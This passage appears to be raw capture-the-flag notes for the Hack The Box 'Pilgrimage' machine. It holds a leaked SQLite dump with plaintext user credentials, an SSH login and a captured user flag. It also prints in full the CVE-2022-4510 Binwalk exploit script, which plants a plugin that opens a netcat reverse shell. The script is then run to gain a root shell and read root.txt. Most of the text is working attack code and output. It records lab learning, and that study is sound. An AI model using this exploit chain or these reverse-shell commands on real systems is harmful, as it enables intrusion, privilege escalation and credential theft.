+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+00000032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f
+363462616630393634373561342e706e670231036909687474703a2f2f70696c6772696d
+6167652e6874622f736872756e6b2f363462616533666566316138342e706e67
+
+    signature: 78b9dfbaedd0d5cd7cb91c9ff9c2c2c925fd67a642483e6cd977973230841b28
+  Artifacts:
+    filename: 64baf193755c2.png
+    verbose: true
+  Tainted: False
+  Filesize: 1903B
+  Number pixels: 16384
+  Pixels per second: 12.5209MB
+  User time: 0.000u
+  Elapsed time: 0:01.001
+  Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
+
+SQLite format 3......@  ...³...................................................................³..K.
+.ø...º..e.Í.º.8......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................|.......Stableimagesimages.CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+...?...indexsqlite_autoindex_images_1images.f.......+tableusersusers.CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))...=...indexsqlite_autoindex_users_1users.........
+.....¢..æ.Ý.Î.¼.¯.¢...................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................useruser.....rootroot.....wittywitty123
+....adminadmin.....Ã¤''....-emilyabigchonkyboi123
+.....É..å.÷.Ò.É.Û.ï.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................user.....root.	...witty.	...admin.....Ã¤'....	emily
+.....G....G...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................B..i#.http://pilgrimage.htb/shrunk/64baf096475a4.pngexploit.pngwittys..i...http://pilgrimage.htb/shrunk/64bae3fef1a84.pngApproved-stamp-illustration-on-transparent-background-PNG.pngÃ¤'
+........Î.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................2.i.http://pilgrimage.htb/shrunk/64baf096475a4.png.1.i	http://pilgrimage.htb/shrunk/64bae3fef1a84.png
+
+emily abigchonkyboi123
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ ssh emily@10.10.11.219
+emily@10.10.11.219's password: 
+Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jul 22 06:45:35 2023 from 10.10.15.43
+emily@pilgrimage:~$ ls
+binwalk_exploit.png  lin.sh  pspy64  user.txt
+emily@pilgrimage:~$ cat user.txt
+8335aa5ca2dbfc61b85d2a4c4b77a815
+
+emily@pilgrimage:~$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/07/22 07:04:00 CMD: UID=1000  PID=58784  | ./pspy64 
+2023/07/22 07:04:00 CMD: UID=1000  PID=58775  | -bash 
+2023/07/22 07:04:00 CMD: UID=1000  PID=58774  | sshd: emily@pts/3    
+2023/07/22 07:04:00 CMD: UID=0     PID=58768  | sshd: emily [priv]   
+2023/07/22 07:04:00 CMD: UID=0     PID=58764  | 
+2023/07/22 07:04:00 CMD: UID=0     PID=58752  | 
+2023/07/22 07:04:00 CMD: UID=0     PID=58729  | 
+2023/07/22 07:04:00 CMD: UID=0     PID=58706  | 
+2023/07/22 07:04:00 CMD: UID=1000  PID=58701  | -bash 
+2023/07/22 07:04:00 CMD: UID=1000  PID=58700  | sshd: emily@pts/1    
+2023/07/22 07:04:00 CMD: UID=0     PID=58694  | sshd: emily [priv]   
+2023/07/22 07:04:00 CMD: UID=0     PID=58647  | 
+2023/07/22 07:04:00 CMD: UID=0     PID=58643  | 
+2023/07/22 07:04:00 CMD: UID=0     PID=58580  | 
+2023/07/22 07:04:00 CMD: UID=0     PID=58496  | 
+2023/07/22 07:04:00 CMD: UID=1000  PID=58354  | -bash 
+2023/07/22 07:04:00 CMD: UID=1000  PID=58353  | sshd: emily@pts/0    
+2023/07/22 07:04:00 CMD: UID=0     PID=58347  | sshd: emily [priv]   
+2023/07/22 07:04:00 CMD: UID=1000  PID=43014  | -bash 
+2023/07/22 07:04:00 CMD: UID=1000  PID=43013  | sshd: emily@pts/2    
+2023/07/22 07:04:00 CMD: UID=0     PID=43007  | sshd: emily [priv]   
+2023/07/22 07:04:00 CMD: UID=33    PID=15470  | php-fpm: pool www                                                             
+2023/07/22 07:04:00 CMD: UID=33    PID=14795  | php-fpm: pool www                                                             
+2023/07/22 07:04:00 CMD: UID=33    PID=14793  | php-fpm: pool www                                                             
+2023/07/22 07:04:00 CMD: UID=1000  PID=8225   | /usr/bin/gpg-agent --supervised 
+2023/07/22 07:04:00 CMD: UID=1000  PID=1091   | (sd-pam) 
+2023/07/22 07:04:00 CMD: UID=1000  PID=1090   | /lib/systemd/systemd --user 
+2023/07/22 07:04:00 CMD: UID=0     PID=829    | 
+2023/07/22 07:04:00 CMD: UID=33    PID=827    | nginx: worker process                            
+2023/07/22 07:04:00 CMD: UID=33    PID=826    | nginx: worker process                            
+2023/07/22 07:04:00 CMD: UID=0     PID=825    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
+2023/07/22 07:04:00 CMD: UID=0     PID=712    | /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
+2023/07/22 07:04:00 CMD: UID=0     PID=707    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
+2023/07/22 07:04:00 CMD: UID=0     PID=696    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
+2023/07/22 07:04:00 CMD: UID=0     PID=684    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       
+2023/07/22 07:04:00 CMD: UID=0     PID=661    | /bin/bash /usr/sbin/malwarescan.sh 
+2023/07/22 07:04:00 CMD: UID=0     PID=660    | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ 
+2023/07/22 07:04:00 CMD: UID=0     PID=658    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=656    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=655    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=654    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=646    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=641    | /lib/systemd/systemd-logind 
+2023/07/22 07:04:00 CMD: UID=0     PID=639    | /usr/sbin/rsyslogd -n -iNONE 
+2023/07/22 07:04:00 CMD: UID=0     PID=637    | /bin/bash /usr/sbin/malwarescan.sh 
+2023/07/22 07:04:00 CMD: UID=103   PID=635    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+2023/07/22 07:04:00 CMD: UID=0     PID=634    | /usr/sbin/cron -f 
+2023/07/22 07:04:00 CMD: UID=0     PID=633    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=630    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=628    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=623    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=616    | 
+2023/07/22 07:04:00 CMD: UID=0     PID=614    | 
+2023/07/22 07:04:00 CMD: UID=998   PID=571    | /usr/local/sbin/laurel --config /etc/laurel/config.toml 
+2023/07/22 07:04:00 CMD: UID=0     PID=567    | /sbin/auditd 
+2023/07/22 07:04:00 CMD: UID=0     PID=563    | /usr/bin/vmtoolsd 
+2023/07/22 07:04:00 CMD: UID=0     PID=562    | /usr/bin/VGAuthService 
+2023/07/22 07:04:00 CMD: UID=104   PID=561    | /lib/systemd/systemd-timesyncd 
+2023/07/22 07:04:00 CMD: UID=0     PID=523    | /lib/systemd/systemd-udevd 
+2023/07/22 07:04:00 CMD: UID=0     PID=501    | /lib/systemd/systemd-journald 
+
+emily@pilgrimage:~$ ps aux | grep pts
+emily      43013  0.0  0.1  15720  7348 ?        S    02:17   0:01 sshd: emily@pts/2
+emily      43014  0.0  0.1   9012  5580 pts/2    Ss+  02:17   0:00 -bash
+emily      58353  0.0  0.1  14720  6060 ?        S    05:42   0:00 sshd: emily@pts/0
+emily      58354  0.0  0.1   8672  5436 pts/0    Ss+  05:42   0:00 -bash
+emily      58700  0.0  0.1  14720  6092 ?        S    06:45   0:00 sshd: emily@pts/1
+emily      58701  0.0  0.1   8164  4872 pts/1    Ss+  06:45   0:00 -bash
+emily      58774  0.0  0.1  14712  5864 ?        S    07:02   0:00 sshd: emily@pts/3
+emily      58775  0.0  0.1   8672  5372 pts/3    Ss   07:02   0:00 -bash
+emily      58797  0.0  0.0   9756  3300 pts/3    R+   07:08   0:00 ps aux
+emily      58798  0.0  0.0   6240   640 pts/3    R+   07:08   0:00 grep pts
+emily@pilgrimage:~$ who
+emily    pts/0        2023-07-22 05:42 (10.10.14.244)
+emily    pts/1        2023-07-22 06:45 (10.10.15.43)
+emily    pts/2        2023-07-22 02:17 (10.10.15.80)
+emily    pts/3        2023-07-22 07:02 (10.10.14.19)
+emily@pilgrimage:~$ w
+ 07:08:28 up  8:25,  4 users,  load average: 0.01, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+emily    pts/0    10.10.14.244     05:42    1:20m  0.03s  0.03s -bash
+emily    pts/1    10.10.15.43      06:45   22:04   0.01s  0.01s -bash
+emily    pts/2    10.10.15.80      02:17    2:33m  0.35s  0.35s -bash
+emily    pts/3    10.10.14.19      07:02    2.00s  0.03s  0.00s w
+
+emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
+#!/bin/bash
+
+blacklist=("Executable script" "Microsoft executable")
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
+	binout="$(/usr/local/bin/binwalk -e "$filename")"
+        for banned in "${blacklist[@]}"; do
+		if [[ "$binout" == *"$banned"* ]]; then
+			/usr/bin/rm "$filename"
+			break
+		fi
+	done
+done
+
+emily@pilgrimage:~$ /usr/local/bin/binwalk
+
+Binwalk v2.3.2
+Craig Heffner, ReFirmLabs
+https://github.com/ReFirmLabs/binwalk
+
+https://www.exploit-db.com/exploits/51249
+
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ ls -lah
+total 8.0K
+drwxrwxrwx 2 root root 4.0K Jul 22 07:00 .
+drwxr-xr-x 7 root root 4.0K Jun  8 00:10 ..
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat binwalk_rce.py      
+# Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)
+# Exploit Author: Etienne Lacoche
+# CVE-ID: CVE-2022-4510
+import os
+import inspect
+import argparse
+
+print("")
+print("################################################")
+print("------------------CVE-2022-4510----------------")
+print("################################################")
+print("--------Binwalk Remote Command Execution--------")
+print("------Binwalk 2.1.2b through 2.3.2 included-----")
+print("------------------------------------------------")
+print("################################################")
+print("----------Exploit by: Etienne Lacoche-----------")
+print("---------Contact Twitter: @electr0sm0g----------")
+print("------------------Discovered by:----------------")
+print("---------Q. Kaiser, ONEKEY Research Lab---------")
+print("---------Exploit tested on debian 11------------")
+print("################################################")
+print("")
+
+parser = argparse.ArgumentParser()
+parser.add_argument("file", help="Path to input .png file",default=1)
+parser.add_argument("ip", help="Ip to nc listener",default=1)
+parser.add_argument("port", help="Port to nc listener",default=1)
+
+args = parser.parse_args()
+            
+if args.file and args.ip and args.port:
+    header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
+    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']
+
+    in_file = open(args.file, "rb")
+    data = in_file.read()
+    in_file.close()
+    
+    with open("/tmp/plugin", "w") as f:
+       for line in lines:
+          f.write(line)
+
+    with open("/tmp/plugin", "rb") as f: 
+        content = f.read()
+
+    os.system("rm /tmp/plugin")
+
+    with open("binwalk_exploit.png", "wb") as f:
+        f.write(data)
+        f.write(header_pfs)
+        f.write(content)
+
+    print("")    
+    print("You can now rename and share binwalk_exploit and start your local netcat listener.")
+    print("")
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 binwalk_rce.py youfoundme.png 10.10.14.19 4444
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mv youfoundme.png binwalk_exploit.png 
+
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.19/binwalk_exploit.png
+--2023-07-22 07:21:53--  http://10.10.14.19/binwalk_exploit.png
+Connecting to 10.10.14.19:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 89894 (88K) [image/png]
+Saving to: ‘binwalk_exploit.png’
+
+binwalk_exploit.png 100%[================>]  87.79K   217KB/s    in 0.4s    
+
+2023-07-22 07:21:54 (217 KB/s) - ‘binwalk_exploit.png’ saved [89894/89894]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 80                          
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.219 - - [21/Jul/2023 17:21:52] "GET /binwalk_exploit.png HTTP/1.1" 200 -
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ ls
+binwalk_exploit.png
+
+nope i need to execute on the machine compromised 
+
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ ls
+binwalk_exploit.png
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ rm binwalk_exploit.png
+
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.19/binwalk_rce.py
+--2023-07-22 07:37:56--  http://10.10.14.19/binwalk_rce.py
+Connecting to 10.10.14.19:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2750 (2.7K) [text/x-python]
+Saving to: ‘binwalk_rce.py’
+
+binwalk_rce.py        100%[========================>]   2.69K  --.-KB/s    in 0.001s  
+
+2023-07-22 07:37:57 (3.75 MB/s) - ‘binwalk_rce.py’ saved [2750/2750]
+
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.19/user.jpg
+--2023-07-22 07:38:27--  http://10.10.14.19/user.jpg
+Connecting to 10.10.14.19:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 12721 (12K) [image/jpeg]
+Saving to: ‘user.jpg’
+
+user.jpg              100%[========================>]  12.42K  45.7KB/s    in 0.3s    
+
+2023-07-22 07:38:28 (45.7 KB/s) - ‘user.jpg’ saved [12721/12721]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444                                   
+listening on [any] 4444 ...
+
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ python3 binwalk_rce.py user.jpg 10.10.14.19 4444
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444                                   
+listening on [any] 4444 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.11.219] 57322
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+quarantine
+reset.sh
+root.txt
+cat root.txt
+44eb343bf748c4b8ebe9e0ee47011c3e
+cat reset.sh
+#!/bin/bash
+/usr/bin/sqlite3 /var/db/pilgrimage <<EOF
+delete from images;
+delete from users;
+insert into users (username,password) values ("emily","abigchonkyboi123");
+EOF
+
+/usr/bin/sudo -u www-data /usr/bin/rm -r /var/www/pilgrimage.htb/shrunk/*
+/usr/bin/sudo -u www-data /usr/bin/rm -r /var/www/pilgrimage.htb/tmp/*
+/usr/bin/rm -r /root/quarantine/*
+
+
+```
+
+[[Fusion Corp]]
